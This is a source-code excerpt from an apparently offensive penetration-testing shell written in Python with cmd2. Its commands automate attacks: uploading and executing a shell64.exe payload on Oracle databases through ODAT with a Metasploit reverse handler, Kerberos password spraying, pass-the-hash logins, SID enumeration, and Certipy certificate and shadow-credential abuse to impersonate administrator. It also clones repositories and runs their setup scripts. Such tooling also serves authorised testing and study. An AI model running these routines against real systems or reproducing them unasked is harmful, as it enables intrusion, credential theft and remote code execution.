        Command wpscan: Installs and runs WPScan to perform WordPress vulnerability scanning.

        This function performs the following tasks:
        1. Checks if WPScan is installed.
        2. Installs WPScan using gem if not already installed.
        3. Prompts the user for a URL to scan.
        4. Allows the user to choose additional WPScan options such as --stealthy or --enumerate.
        5. Executes the WPScan command with the chosen options.

        Args:
            line (str): Optional argument to specify the URL or additional WPScan options.

        Returns:
            None

        Example:
            wpscan --url blog.tld
        """
        url_target = self.params["url"]

        if not is_binary_present("wpscan"):
            print_msg("WPScan not found, installing it using gem...")
            self.cmd("sudo gem install wpscan")
        else:
            print_msg("WPScan is already installed.")

        if not line:
            url = self.ask(f"    [!] Enter the WordPress site URL to scan (default {url_target}): ", url_target)
        else:
            url = line.strip()

        if not url:
            print_warn("No URL provided, aborting scan.")
            return

        stealthy = self.ask("    [?] Do you want to enable stealthy mode? (y/n): ").lower() or "n"
        stealthy_flag = "--stealthy" if stealthy == "y" else ""

        enumerate_option = (
            self.ask(
                "    [?] Do you want to enumerate usernames or plugins? (e.g., u, u1-100, p,  default is none): "
            , "")
        )
        enumerate_flag = f"--enumerate {enumerate_option}" if enumerate_option else ""

        api_token_flag = ""
        if os.getenv("WPSCAN_API_TOKEN"):
            api_token_flag = f"--api-token {os.getenv('WPSCAN_API_TOKEN')}"
        else:
            print_warn(
                'WPScan API token not found in environment (export WPSCAN_API_TOKEN="your_api_token"). You can still run the scan without vulnerability data.'
            )

        command = f"wpscan --url {url} {stealthy_flag} {enumerate_flag} {api_token_flag}"
        print_msg(f"Running WPScan: {command}")

        self.cmd(command)
        return



    @cmd2.with_category("02. Scanning & Enumeration")
    def do_parth(self, line):
        """
        Command parth: Installs and runs Parth for discovering vulnerable URLs and parameters.

        This function performs the following tasks:
        1. Checks if Parth is already cloned in the external/.exploit directory.
        2. Clones the Parth repository if not present.
        3. Installs required dependencies using pip3.
        4. Prompts the user for a URL, file input, or import option and allows for custom output such as JSON or saving parameter names.
        5. Executes Parth for scanning vulnerabilities like LFI, SSRF, SQLi, XSS, and open redirects.
        6. Displays real-time results and optionally saves output in a file.

        Args:
            line (str): Optional argument for specifying the target self.params['domain'], import file, or additional Parth options.

        Returns:
            None

        Example:
            parth -t example.com
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        parth_url = "https://github.com/s0md3v/Parth.git"
        parth_dir = os.path.join(exploit_dir, "Parth")
        domain = self.params["domain"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(parth_dir):
            print_msg("Cloning Parth repository...")
            self.cmd(f"git clone {parth_url} {parth_dir}")
            print_msg("Installing Parth requirements...")
            self.cmd("pip3 install parth")

        else:
            print_msg("Parth already cloned, skipping cloning.")

        if not line:
            target = (
                self.ask(
                    f"    {GREEN}[!] Enter the target self.params['domain'] or file: (default: {self.params['domain']}) "
                , self.params["domain"])
            )
            output = self.ask("    [?] Do you want to save output as JSON (y/n)? ").lower() or "n"
            json_output = f"-o {target}.json" if output == "y" else ""
            import_option = (
                self.ask("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ", "")
            )
        else:
            target = line.strip()
            output = self.ask("    [?] Do you want to save output as JSON (y/n)? ").lower() or "n"
            json_output = f"-o {target}.json" if output == "y" else ""
            import_option = (
                self.ask("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ", "")
            )

        if not target:
            print_warn("No target provided, aborting scan.")
            return

        command = f"parth -t {target} {json_output} {import_option}"
        print_msg(f"Running Parth scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_breacher(self, line):
        """
        Command breacher: Installs and runs Breacher for finding admin login pages and EAR vulnerabilities.

        This function performs the following tasks:
        1. Checks if Breacher is already cloned in the external/.exploit directory.
        2. Clones the Breacher repository if not present.
        3. Installs required dependencies.
        4. Prompts the user for a target URL, file type (php, asp, html), custom paths, and thread options.
        5. Executes Breacher for scanning admin login pages and potential EAR vulnerabilities.
        6. Supports multi-threading and custom paths for enhanced scanning.

        Args:
            line (str): Optional argument for specifying the target URL, file type, and additional Breacher options.

        Returns:
            None

        Example:
            breacher -u example.com --type php
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        breacher_url = "https://github.com/s0md3v/Breacher.git"
        breacher_dir = os.path.join(exploit_dir, "Breacher")
        url = self.params["url"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(breacher_dir):
            print_msg("Cloning Breacher repository...")
            self.cmd(f"git clone {breacher_url} {breacher_dir}")
            print_msg("Installing Breacher requirements...")
            self.cmd(f"pip3 install -r {breacher_dir}/requirements.txt")

        else:
            print_msg("Breacher already cloned, skipping cloning.")

        if not line:
            url = self.ask(f"    [!] Enter the target URL (default: {url}): ", url)
            file_type = self.ask("    [?] Enter the file type (php, asp, html): ", "php")
            custom_path = self.ask("    [?] Specify a custom path of url (optional): ", "")
            threads = self.ask("    [?] Enable multi-threading? (y/n): ").lower() or "n"
            fast_flag = "--fast" if threads == "y" else ""
        else:
            args = line.split()
            url = args[0] if len(args) > 0 else ""
            file_type = args[1] if len(args) > 1 else "php"
            custom_path = args[2] if len(args) > 2 else ""
            fast_flag = "--fast" if len(args) > 3 and args[3] == "--fast" else ""

        if not url:
            print_warn("No URL provided, aborting scan.")
            return

        path_flag = f"--path {custom_path}" if custom_path else ""
        command = f"python {breacher_dir}/breacher.py -u {url} --type {file_type} {path_flag} {fast_flag}"

        print_msg(f"Running Breacher scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_openredirex(self, line):
        """
        Command openredirex: Clones, installs, and runs OpenRedirex for testing open redirection vulnerabilities.

        This function performs the following tasks:
        1. Clones the OpenRedirex repository if not already cloned.
        2. Installs the required dependencies using the setup script.
        3. Prompts the user for required inputs like the URL list, payloads file, keyword, and concurrency level.
        4. Executes OpenRedirex to scan the provided URLs for open redirection vulnerabilities.

        Args:
            line (str): Optional argument for specifying the URL list, payload file, keyword, and concurrency level.

        Returns:
            None

        Example:
            openredirex list_of_urls.txt payloads.txt FUZZ 50
        """
        url = self.params["url"]
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        openredirex_url = "https://github.com/devanshbatham/openredirex.git"
        openredirex_dir = os.path.join(exploit_dir, "openredirex")
        file_payloads = f"{path}/sessions/payloads.txt"
        os.makedirs(exploit_dir, exist_ok=True)
        file_url = f"{path}/sessions/urls.txt"
        with open(file_url, "w") as file:
            file.write(url)

        if not os.path.exists(openredirex_dir):
            print_msg("Cloning OpenRedirex repository...")
            self.cmd(f"git clone {openredirex_url} {openredirex_dir}")
            print_msg("Setting up OpenRedirex...")
            self.cmd(f"chmod +x {openredirex_dir}/setup.sh && {openredirex_dir}/setup.sh")
        else:
            print_msg("OpenRedirex already cloned and setup, skipping setup.")

        if not line:
            urls_file = (
                self.ask(f"    {GREEN}[!] Enter the path to the list of URLs (default: {file_url}): ", file_url)
            )
            payloads_file = (
                self.ask(f"    [?] Enter the path to the payloads file (default: {file_payloads}): ", file_payloads)
            )
            keyword = self.ask("    [?] Enter the keyword to replace in URLs (default 'FUZZ'): ", "FUZZ")
            concurrency = self.ask("    [?] Enter the concurrency level (default 100): ", "100")

        else:
            args = line.split()
            urls_file = args[0] if len(args) > 0 else ""
            payloads_file = args[1] if len(args) > 1 else ""
            keyword = args[2] if len(args) > 2 else "FUZZ"
            concurrency = args[3] if len(args) > 3 else "100"

        if not urls_file:
            print_warn("No URL file provided, aborting scan.")
            return

        payloads_option = f"-p {payloads_file}" if payloads_file else ""
        command = f"cat {urls_file} | python3 {openredirex_dir}/openredirex.py {payloads_option} -k {keyword} -c {concurrency}"

        print_msg(f"Running OpenRedirex scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_odat(self, line):
        """
        Command odat: Runs the ODAT sidguesser module to guess Oracle SIDs on a target Oracle database.

        This function performs the following tasks:
        1. Ensures that ODAT is installed (checks if 'odat.py' exists).
        2. Allows the user to specify the RHOST and port.
        3. Runs ODAT's 'sidguesser' module with the specified parameters.

        Args:
            line (str): Optional argument for specifying additional ODAT options.

        Returns:
            None

        Example:
            odat
        """
        rhost = self.params["rhost"]
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        sessions_dir = os.path.join(path, "sessions")
        file_gz = "odat-linux-libc2.17-x86_64.tar.gz"
        odat_url = "https://github.com/quentinhardy/odat/releases/download/5.1.1/odat-linux-libc2.17-x86_64.tar.gz"
        odat_dir = os.path.join(exploit_dir, "odat")
        odat_path = f"{odat_dir}/odat-libc2.17-x86_64/odat-libc2.17-x86_64"
        if not os.path.exists(odat_path):
            print_msg("Download from ODAT repository...")
            command = f"mkdir {odat_dir} && cd {odat_dir} && wget {odat_url} && tar -vzxf {file_gz} --strip-components=1 && chmod +x {odat_path}"
            print(command)
            self.cmd(command)
            print_msg("ODAT downloaded successfully.")
            print_msg("Running ODAT sidguesser...")
        else:
            print_msg("ODAT already downloaded, skipping download.")

        rhost = (
            self.ask(f"    {GREEN}[!] Enter the target RHOST (default {self.params['rhost']}): ", self.params["rhost"])
        )
        port = self.ask("    [?] Enter the target port (default 1521): ", "1521")

        if not line:
            list_attacks = ["sidguesser", "passwordguesser", "utlfile", "externaltable"]
            print_msg("Select an attack: ")
            for i, attack in enumerate(list_attacks, 1):
                print_warn(f"{i}. {attack}")
        try:
            selected_attack = int(self.ask(f"{GREEN}    [!] Enter yout choice (1-{len(list_attacks)}): "))
            if 1 <= selected_attack <= len(list_attacks):
                print_msg(f"Attack selected: {list_attacks[selected_attack - 1]}")
                line = list_attacks[selected_attack - 1]
            else:
                print_error(f"Wrong choice: {len(list_attacks)}.")
                return
        except ValueError:
            print_error("Enter a valid option.")
            return

        if line.startswith("sidguesser"):
            odat_command = (
                f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} sidguesser -s {self.params['rhost']} -p {port}"
            )
            print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")

            self.cmd(odat_command)

        elif line.startswith("passwordguesser"):
            SID = self.ask("    [!] Enter valid SID: ")
            odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} passwordguesser -s {self.params['rhost']} -p {port} -d {SID} --accounts-file accounts/accounts.txt"
            print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")

            self.cmd(odat_command)

        elif line.startswith("utlfile"):
            if os.path.exists(os.path.join(sessions_dir, "shell64.exe")):
                if os.path.exists(os.path.join(sessions_dir, "credentials.txt")):
                    credentials = get_credentials()
                    if not credentials:
                        return

                    for user, passwd in credentials:
                        password = passwd
                        username = user
                    SID = self.ask("    [!] Enter valid SID: ")
                    odat_command = f"cd {sessions_dir} && {odat_path} utlfile -s {self.params['rhost']} -p {port} -U {username} -P {password} -d {SID} --sysdba --putFile /temp shell64.exe shell64.exe"
                    print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")

                    self.cmd(odat_command)
                else:
                    print_error(f"Credentials must be assign, use: {GREEN}createcredentials admin:admin")
            else:
                print_error(f"Shell64.exe not found, use: {GREEN}venom")

        elif line.startswith("externaltable"):
            if os.path.exists(os.path.join(sessions_dir, "credentials.txt")):
                credentials = get_credentials()
                if not credentials:
                    return

                for user, passwd in credentials:
                    password = passwd
                    username = user
                SID = self.ask("    [!] Enter valid SID: ")
                odat_command = f"{odat_path} externaltable -s {self.params['rhost']} -p {port} -U {username} -P {password} -d {SID} --sysdba --exec /temp shell64.exe"
                print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")
                self.ask(
                    f"Press enter to execute, rember metasploit handdler must be listening, use in another terminal:{GREEN} msf rev win64 {RESET}"
                )
                self.cmd(odat_command)
            else:
                print_error(f"Credentials must be assign, use: {GREEN}createcredentials admin:admin")
        else:
            print_error("Wrong choice")
        print_msg("Odat command executed: odat_command")
        return


    @cmd2.with_category("02. Scanning & Enumeration")
    def do_pykerbrute(self, line):
        """
        Command pykerbrute: Automates the installation and execution of PyKerbrute for bruteforcing Active Directory accounts using Kerberos pre-authentication.

        This function performs the following tasks:
        1. Clones and installs PyKerbrute if not already installed.
        2. Allows the user to choose between the EnumADUser.py and ADPwdSpray.py scripts.
        3. Executes the selected script with user-defined parameters, including self.params['domain'], mode (TCP/UDP), and selected hash or password.

        Args:
            line (str): Optional argument for specifying additional parameters for execution, such as self.params['domain'] controller, self.params['domain'], and attack mode.

        Returns:
            None
        """

        pykerbrute_repo = "https://github.com/grisuno/pyKerbrute.git"
        pykerbrute_dir = os.path.join(os.getcwd(), "external/.exploit/pyKerbrute")
        export = f" export PYTHONPATH=$PYTHONPATH:{pykerbrute_dir}/_crypto:{pykerbrute_dir}/pyasn1 && "
        if not os.path.exists(pykerbrute_dir):
            print_msg("Cloning PyKerbrute repository...")
            self.cmd(f"git clone {pykerbrute_repo} {pykerbrute_dir}")
            print_msg("Installing required dependencies...")
            self.cmd(f"cd {pykerbrute_dir} && chmod +x {pykerbrute_dir}/install.sh && {pykerbrute_dir}/install.sh")
            self.cmd("sudo apt-get install python2.7 python2.7-dev")
        else:
            print_msg("PyKerbrute already installed, skipping setup.")

        print_msg("Choose the PyKerbrute attack mode:")
        print_warn("1. Enumerate valid Active Directory accounts (EnumADUser.py)")
        print_warn("2. Password spray (ADPwdSpray.py)")

        attack_choice = self.ask("Enter the number of the attack mode you want to use: ")

        if attack_choice == "1":
            script = "EnumADUser.py"
        elif attack_choice == "2":
            script = "ADPwdSpray.py"
        else:
            print_warn("Invalid choice. Aborting...")
            return
        self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        users_file = "henry.vinson"
        domain_controller = (
            self.ask(f"    [?] Enter the Domain Controller address (default '{subdomain}'): ", subdomain)
        )
        domain = (
            self.ask(f"    [?] Enter the self.params['domain'] name (default '{self.params['domain']}'): ", self.params["domain"])
        )
        user_file = self.ask(f"    [?] Enter the username (default '{users_file}'): ", users_file)

        if script == "ADPwdSpray.py":
            password_data = get_hash(True)
            if not password_data:
                print_error("No password hash selected. Exiting.")
                return
            command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {self.params['domain']} {user_file} {password_data} "
        else:
            user_file = get_users_dic()
            mode_choice = self.ask("    [!] Enter mode: (tcp/udp): ", "tcp")
            command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {self.params['domain']} {user_file} {mode_choice}"

        print_msg(f"Executing: {command}")
        self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_netview(self, line):
        """
        Executes the Impacket netview tool to list network shares on a specified target.

        This function performs the following actions:
        1. Checks if the target host is valid.
        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and allows the user to select which file to use for executing the command.
        3. If line is "hash", it searches for a hash file and prompts the user for a username, then constructs
        and executes the command with the hash.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): A command argument to determine the authentication mode.
                    If "pass", the function searches for credential files and authenticates using the selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it prints an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(self.params["rhost"]):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"impacket-netview -user {user} -target {self.params['domain']} -dc-ip {self.params['rhost']} {self.params['domain']}/{user}:{passwd}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"
            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
            command = f"impacket-netview -user {user} -target {self.params['domain']} -dc-ip {self.params['rhost']} {hashis} {self.params['domain']}/{user}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_rdp_check_py(self, line):
        """
        Executes the RDP check tool to verify credentials or hash-based authentication on a target system.

        This function performs the following actions:
        1. Validates the target IP (self.params['rhost']).
        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and prompts the user to select one to execute the RDP check.
        3. If line is "hash", it searches for a hash file, prompts the user for a username, and constructs the command
        using the hash for authentication.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(self.params["rhost"]):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/rdp_check.py {self.params['domain']}/{user}:{passwd}@{self.params['rhost']}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
            command = f"env/bin/rdp_check.py {self.params['domain']}/{user}@{self.params['rhost']} {hashis}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_mqtt_check_py(self, line):
        """
        Executes the MQTT check tool to verify credentials on a target system with optional SSL.

        This function performs the following actions:
        1. Validates the target IP (self.params['rhost']).
        2. If the line argument is "pass", it searches for credential files matching the pattern `credentials*.txt`
        and prompts the user to select one to execute the MQTT check.
        3. If line is "ssl", it performs the MQTT check with SSL enabled using the selected credentials.
        4. If line does not match "pass" or "ssl", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "ssl", it authenticates using SSL.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()

        if not check_rhost(self.params["rhost"]):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/mqtt_check.py {self.params['domain']}/{user}:{passwd}@{self.params['rhost']}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "ssl":
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/mqtt_check.py {self.params['domain']}/{user}:{passwd}@{self.params['rhost']} -ssl"
                print_msg(command)
                self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'ssl' to enable SSL.")
            return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_lookupsid_py(self, line):
        """
        Executes the LookupSID tool to perform SID enumeration on a target system.

        This function performs the following actions:
        1. Validates the target IP (self.params['rhost']).
        2. If the line argument is "basic", it searches for credential files with the pattern `credentials*.txt`
        and prompts the user to select one to execute the SID lookup.
        3. If line is "dc-target", it performs the SID lookup specifying self.params['domain'] controller and target IPs,
        using the selected credentials.
        4. If line does not match "basic" or "dc-target", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the lookup mode.
                    If "basic", the function performs a standard SID lookup.
                    If "dc-target", it includes `-dc-ip` and `-target-ip` arguments.
                    If "nopass", We run lookupsid.py , using an arbitrary username prepended to the target's IP address
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()

        if not check_rhost(self.params["rhost"]):
            return

        if line == "basic":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"lookupsid.py {self.params['domain']}/{user}:{passwd}@{self.params['rhost']}"
                print_msg(command)
                self.cmd(command)
                self.cmd(f"{command}  | grep 'SidTypeUser' | sed 's/.*\\\\ (.*\\) (SidTypeUser)/\1/' > usernames.txt")
            return

        elif line == "dc-target":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            dc_ip = (
                self.ask(f"    [!] Enter Domain Controller IP (default: {self.params['rhost']}): ", self.params["rhost"])
            )
            target_ip = self.ask(f"    [!] Enter Target IP (default: {self.params['rhost']}): ", self.params["rhost"])
            if not dc_ip or not target_ip:
                print_error("Domain Controller and Target IPs are required for 'dc-target' mode.")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/lookupsid.py -self.params['domain']-sids -target-ip {target_ip} {self.params['domain']}/{user}:{passwd}"
                print_msg(command)
                self.cmd(command)
            return
        elif line == "nopass":
            increase = self.ask("    [!] We increase this limit to (default 10000) ", "10000")
            command = f"lookupsid.py nan@{self.params['rhost']} {increase} -no-pass | grep 'SidTypeUser' | sed 's/.*\\(.*\\) \\(SidTypeUser\\)/\\1/' > sessions/{self.params['rhost']}_lookupsid_usernames.txt"
            print_msg(command)
            self.cmd(command)

        else:
            print_error("Incorrect usage. Use 'basic' for standard SID lookup or 'dc-target' to specify IPs.")
            return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_lookupsid(self, line):
        """
        Executes the Impacket lookupsid tool to enumerate SIDs on a target system.

        This function performs the following actions:
        1. Validates the target IP (or hostname) specified in the line argument.
        2. If the line argument is "pass", it searches for credential files with the pattern credentials*.txt
        and prompts the user to select one to execute the lookupsid command.
        3. If line is "hash", it prompts the user for a username and constructs the command using the hash for authentication.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        credentials_path = f"{path}/sessions/credentials.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if line == "pass":
            if not os.path.exists(credentials_path):
                print_error("Need credentials to use this option. Use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"impacket-lookupsid {self.params['domain']}/{user}:{passwd}@{self.params['rhost']}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
            command = f"impacket-lookupsid {self.params['domain']}/{user}@{self.params['rhost']} {hashis}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_certipy_ad(self, line):
        """Run certipy-ad against Active Directory Certificate Services.

        Supports shadow, vuln, find, account, and auth subcommands.
        Requires self.params['rhost'], self.params['domain'], and credentials in payload.json.

        Args:
            line (str): Subcommand to run (shadow | vuln | find | account | auth).

        Returns:
            None
        """
        target = self.params["rhost"]
        domain = self.params["domain"]
        self.params["subdomain"]
        credentials = get_credentials()
        for user, passwd in credentials:  # noqa: B007
            pass

        if not credentials:
            return
        if line.startswith("shadow"):
            username = user
            password = passwd
            account = self.ask("    [!] Enter Account for shadow abuse (default WINRM_SVC): ", "WINRM_SVC")
            command = f"certipy-ad shadow auto -u '{username}@{self.params['domain']}' -p '{password}' -account '{account}' -dc-ip {target}"
            self.cmd(command)

        elif line.startswith("vuln"):
            hash_content = get_hash()
            username = user
            password = passwd
            account = self.ask("    [!] Enter Account for vulnerable abuse (default CA_SVC): ", "CA_SVC")
            command = f'certipy-ad find -vulnerable -u {account} -hashes ":{hash_content}" -dc-ip {target}'
            self.cmd(command)

        elif line.startswith("find"):
            hash_content = get_hash()
            account = self.ask("    [!] Enter Account for find abuse (default CA_SVC): ", "CA_SVC")
            command = f"certipy-ad find -username {account} -hashes :{hash_content} -dc-ip {target} -vulnerable"
            self.cmd(command)

        elif line.startswith("acount"):
            account = self.ask("    [!] Enter Account for account abuse (default CA_SVC): ", "CA_SVC")
            command = f"certipy-ad account -u '{user}@{self.params['domain']}' -p '{passwd}' -dc-ip '{target}' -user '{account}' read"
            self.cmd(command)
            upn = self.ask("    [!] Enter Account for upn (default administrator): ", "administrator")
            command = f"certipy-ad account -u '{user}@{self.params['domain']}' -p '{passwd}' -dc-ip '{target}' -upn '{upn}'  -user '{account}' update"
            self.cmd(command)

        elif line.startswith("auth"):
            account = self.ask("    [!] Enter Account for username (default administrator): ", "administrator")
            pfx_file = get_users_dic("pfx")
            if not pfx_file:
                return
            command = f"certipy auth -dc-ip '{target}' -pfx '{pfx_file}' -username '{account}' -self.params['domain'] '{self.params['domain']}'"
            self.cmd(command)

        else:
            print_error("Enter valid option shadow or vuln")
            return
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_certipy(self, line):
        """
        Executes the Certipy tool to interact with Active Directory Certificate Services.

        This function performs the following actions:
        1. Validates the target IP or hostname specified in the line argument.
        2. If line is "find", it executes the certipy find command to enumerate AD CS.
        3. If line is "shadow", it prompts for an account and executes the certipy shadow command.
        4. If line is "req", it prompts for user details and executes the certipy req command to request a certificate.
        5. If line is "auth", it prompts for PFX details and executes the certipy auth command for authentication.
        6. If line is "update", it prompts for user details and executes the certipy account update command.
        7. If line does not match any valid actions, it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the action mode.
                    If "find", it enumerates AD CS.
                    If "shadow", it abuses shadow credentials for account takeover.
                    If "req", it requests a certificate.
                    If "auth", it authenticates using a PFX file.
                    If "update", it updates user information.
                    If none of these, it displays an error message with usage instructions.

        Returns:
        None
        """
        target = self.params["rhost"]
        domain = self.params["domain"]

        if line == "find":
            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
            command = (
                f"certipy find -k -no-pass -u {self.params['domain']}/{user}@{target} -dc-ip {target} -target {target}"
            )
            print_msg(command)
            self.cmd(command)
            return

        elif line == "shadow":
            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
            account = self.ask("    [!] Enter Account for shadow abuse: ")
            command = f"certipy shadow auto -k -no-pass -u {self.params['domain']}/{user}@{target} -dc-ip {target} -target {target} -account {account}"
            print_msg(command)
            self.cmd(command)
            return

        elif line == "req":
            user = self.ask("    [!] Enter Username for certificate request: ")
            password = self.ask("    [!] Enter password for certificate request: ")
            ca = self.ask("    [!] Enter CA name (default: certified-DC01-CA): ", "certified-DC01-CA")
            template = (
                self.ask("    [!] Enter template name (default: CertifiedAuthentication): ", "CertifiedAuthentication")
            )
            command = (
                f"certipy req -username {user}@{self.params['domain']} -p {password} -ca {ca} -template {template}"
            )
            command2 = f"certipy req -u {user}@{self.params['domain']} -p {password} -upn administrator@{self.params['domain']} -target {self.params['domain']} -ca sequel-dc-ca -template UserAuthentication"
            choice = (
                self.ask(f"    [!] {WHITE}Enter the choice 1 to {GREEN}{command}{WHITE} 2 to {GREEN}{command2}{RESET}", "1")
            )
            if choice == "1":
                print_msg(command)
                self.cmd(command)
            else:
                cert = self.ask("Enter the name of certificate default: sequel-dc-ca ", "sequel-dc-ca")
                command2 = f"certipy req -u {user}@{self.params['domain']} -p {password} -upn administrator@{self.params['domain']} -target {self.params['domain']} -ca {cert} -template UserAuthentication"
                print_msg(command2)
                self.cmd(command2)
            return

        elif line == "auth":
            pfx_file = get_users_dic("pfx")
            if not pfx_file:
                return
            command = f"certipy auth -pfx {pfx_file} -self.params['domain'] {self.params['domain']}"
            print_msg(command)
            self.cmd(command)
            return

        elif line == "update":
            user = self.ask("    [!] Enter Username to update: ")
            new_upn = self.ask("    [!] Enter new UPN for user: ")
            command = f"certipy account update -username {user}@{self.params['domain']} -upn {new_upn}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error(
                "Incorrect usage. Use 'find' to enumerate AD CS, 'shadow' to abuse shadow credentials, 'req' to request a certificate, 'auth' to authenticate with PFX, or 'update' to change user information."
            )
            return


    @cmd2.with_category("02. Scanning & Enumeration")
    def do_ad_ldap_enum(self, line):
        """
        Executes ad-ldap-enum to enumerate Active Directory objects (users, groups, computers)
        through LDAP, collecting extended information on group memberships and additional AD details.

        This function enables the enumeration of Active Directory users, groups, and computers
        by executing LDAP queries on a specified self.params['domain'] controller. The command constructed allows
        password or Pass-the-Hash authentication, supports SSL/TLS, and IPv4/IPv6 connections,
        and outputs data into CSV files detailing self.params['domain'] group memberships and extended user/computer
        information.

        Functionalities include:
        1. Checking for credential availability and prompting for them if not found.
